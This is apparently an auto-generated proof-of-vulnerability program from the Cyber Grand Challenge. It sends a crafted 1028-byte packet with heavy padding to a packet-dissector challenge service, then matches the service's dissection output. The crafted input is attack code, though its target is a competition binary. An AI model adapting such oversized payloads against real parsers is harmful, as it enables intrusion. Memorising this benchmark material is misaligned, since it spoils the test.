#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\x04\x04\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x01\x00\x00\x00\xf0\x03\x00\x00\xe8\x03\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\xe8\x03\x00\x00\x17\xd9\x12\x59"
         "\x0c\x22\x9c\x94\xf2\x75\xac\x46\x69\x00\x00\x00\x37\xed\xc7\x65"
         "\x00\xd2\x98\xe5\x22\x19\x66\xd9\xf6\x40\x26\xd6\x85\x43\x3d\xb7"
         "\x97\x95\x63\x5b\xfd\x35\x5b\xf5\x83\x1e\x8c\x13\x0e\xb9\x28\xf2"
         "\x41\x93\xa7\xea\xa1\x7d\x5c\x93\x0b\x55\xdb\x73\xb5\x42\x17\x9a"
         "\x8f\xc6\x12\xea\x0d\x21\xe3\xde\x91\xe5\xb5\xd8\xe6\x68\x58\xe0"
         "\x96\x17\x1c\x88\x41\xc0\xd3\xdc\x16\x96\x4a\x1f\x11\x90\x9f\xec"
         "\x30\x43\x05\xec\xd3\xf9\x69\xd8\x5c\x4f\x06\xb4\xe4\xa4\x2f\x57"
         "\x54\xfa\xac\x99\x19\x49\x5b\xe9\x50\x51\x8f\xd6\x2c\x2e\xd9\x74"
         "\x8e\x13\x35\xeb\x36\xf9\x02\x61\x6a\xa8\x6c\x33\x33\x0a\x58\x38"
         "\xf8\xf0\xfc\x01\x45\xaf\xfc\x3e\xcf\x6c\x06\xf8\x7c\x41\x6a\x66"
         "\x11\xff\xa5\x62\x3b\xfd\x9c\xed\x5f\xb2\x2c\x31\x4d\xaf\xdf\xe8"
         "\xfc\x4d\x00\xae\x43\xfc\x3f\x45\x1d\xae\x59\x1d\x52\x9a\x35\x3f"
         "\x63\x48\xdc\x79\x2e\xd7\xa3\x4e\xc2\x06\xf6\x2d\xfc\x3d\x28\xcc"
         "\x55\x0d\xcd\x77\xfb\xd0\x7a\x19\x42\x31\x7a\x16\x72\x03\x4b\xda"
         "\xc2\xf4\xea\x43\x40\x15\x51\x2b\x85\xf7\xd8\x03\x8a\x75\xe0\x53"
         "\x00\x1d\x83\x7e\x22\xc9\x8a\xe4\xfc\xc5\x0a\x58\x0e\xf5\x07\x2c"
         "\xc6\x48\x17\xe2\xeb\xc1\x9b\x97\x61\x97\x73\xf3\x95\x98\x87\x89"
         "\x49\x9d\x29\x8a\x2d\x48\x96\x04\x07\x01\xde\xf3\x73\xb2\x99\x95"
         "\x5e\xe2\x05\x1d\x86\x71\xc6\x9d\x67\xbd\xab\x5b\x16\xb4\x04\xb9"
         "\x8c\xb1\xb9\xc6\x5b\x7e\xea\x12\x88\xfe\xa0\x11\xdb\x4c\x6d\xa4"
         "\xcb\x4e\x88\xa9\xbd\x70\x74\xa4\x68\xf5\xdf\x9b\x78\x9d\xcc\x5b"
         "\x88\xcf\x25\xcc\xc0\xb6\xff\x8a\x02\x6e\xb6\x05\x31\x70\x45\xe3"
         "\xd3\x71\x75\xe2\x4d\x06\xd0\xa8\x7a\xae\x40\x2d\x2d\x80\xeb\xee"
         "\x70\xdd\x33\xee\x51\x50\xd3\x5a\x9c\xef\x18\x05\x66\x48\x47\xc5"
         "\xdf\xd8\xa4\x3c\xa5\x09\x4a\xb2\x79\xd2\x76\x80\x8f\x24\x7b\xc0"
         "\x27\x84\x8e\x15\x1b\x34\x71\x87\xa9\x6c\x2b\xb7\x39\xfe\x3c\xb7"
         "\x33\x05\x70\x64\xe2\x0c\xbe\xef\xdd\x0c\xc3\x04\x05\xdc\x4e\xce"
         "\xa5\x25\x16\x62\xde\xa8\x95\x4e\x34\x45\x2f\xa5\xa2\xd0\x73\xa5"
         "\xd7\xa3\xb6\x99\x9e\x25\x2a\x91\xad\x7c\xed\xf5\xc4\xb4\x9e\xb2"
         "\xfc\xd9\x11\x3f\x24\x1f\xfe\x26\xa2\x5a\xbf\x15\x1c\x02\x3b\x7f"
         "\xca\x42\x11\x27\xdc\xaf\x13\x17\xd2\x59\x04\x26\xd2\x8b\xdf\x93"
         "\xdf\xeb\x45\x56\x06\xda\xf3\x5e\x28\x0e\x63\x36\xab\xda\x33\xeb"
         "\x6d\x8c\x49\x61\x66\xef\x94\xee\xaa\x37\x9b\x3a\xd1\xa6\x60\xe7"
         "\x9c\x1d\xa5\x68\xa8\x45\xb0\x9b\x92\xa9\x31\x96\x2f\x7b\x88\x4d"
         "\x00\x91\x37\x98\x77\x98\xb3\x4d\xd6\x84\x5e\x5d\x51\x43\x4d\x00"
         "\x4d\x00\x88\xb7\x65\x59\xc1\x83\x8d\x8f\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20"
         "\x20\x20\x20\x20";
      static unsigned int write_00001_00000_len = 1028;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===lol
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6f\x6c";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===unaccoutereddrivebolt
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x75\x6e\x61\x63\x63\x6f\x75\x74\x65\x72\x65"
         "\x64\x64\x72\x69\x76\x65\x62\x6f\x6c\x74";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
